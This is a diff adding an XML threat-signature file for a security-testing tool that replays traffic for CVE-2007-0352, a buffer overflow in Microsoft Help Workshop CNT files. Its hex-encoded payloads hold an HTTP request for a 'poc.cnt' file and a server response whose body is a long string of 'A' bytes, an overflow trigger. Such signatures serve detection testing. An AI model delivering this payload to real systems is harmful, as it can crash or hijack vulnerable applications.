@@ -1,0 +1,94 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Help Workshop CNT Help Contents Buffer Overflow"/>
+    <EngDesc display="true" value="A buffer overflow vulnerability has been found in the Microsoft Help Workshop product. The flaw is created by insufficient boundary checks of strings supplied in Help Content (CNT) files. A malicious user may construct a CNT file that will result in the diversion of the process flow of the vulnerable application."/>
+    <Intent display="true">
+      <item value="BUFFER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Microsoft_Help_Workshop"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Help_Workshop_4.03.0002"/>
+      <item value="Microsoft_Help_Workshop_6.0_Service_Pack_6"/>
+      <item value="Microsoft_Help_Workshop_.NET_2003"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20070117-14"/>
+    <CVEID display="true" value="CVE-2007-0352"/>
+    <bugtraqID display="true" value="22100"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="ddba4899b388931a2603bad3eaa1e85a"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633404247162277500"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1204846996" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="F">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F7E73776172656C69732F706F632E636E7420485454502F312E310D0A4163636570743A202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75730D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A49662D4D6F6469666965642D53696E63653A204D6F6E2C203239204A616E20323030372032313A34333A323420474D540D0A49662D4E6F6E652D4D617463683A20223962383030332D3235392D6334353239373030220D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E313B20535631290D0A486F73743A203137322E31362E312E31310D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="000000000000485454502F312E3120323030204F4B0D0A446174653A204D6F6E2C203239204A616E20323030372032313A34343A303220474D540D0A5365727665723A204170616368652F322E302E3532202843656E744F5329205048502F342E332E390D0A4C6173742D4D6F6469666965643A204D6F6E2C203239204A616E20323030372032313A34333A353820474D540D0A455461673A20223962383030332D3235392D6336353936333830220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203630310D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F706C61696E3B20636861727365743D5554462D380D0A0D0A4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141410A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
